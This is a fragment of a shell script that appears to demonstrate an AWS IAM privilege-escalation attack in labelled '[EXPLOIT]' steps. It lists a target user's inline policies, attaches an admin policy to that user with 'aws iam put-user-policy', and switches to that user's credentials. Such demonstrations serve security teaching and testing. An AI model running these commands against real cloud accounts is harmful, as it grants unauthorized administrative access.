...
show_cmd "ReadOnly" "aws iam list-user-policies --user-name $TARGET_USER_NAME --query 'PolicyNames' --output text"
...
# [EXPLOIT] Step 6: Add admin policy to target user
...
show_attack_cmd "Attacker" "aws iam put-user-policy --user-name $TARGET_USER_NAME --policy-name $ADMIN_POLICY_NAME --policy-document file://$POLICY_FILE"
...
# [EXPLOIT] Step 8: Switch to target user credentials
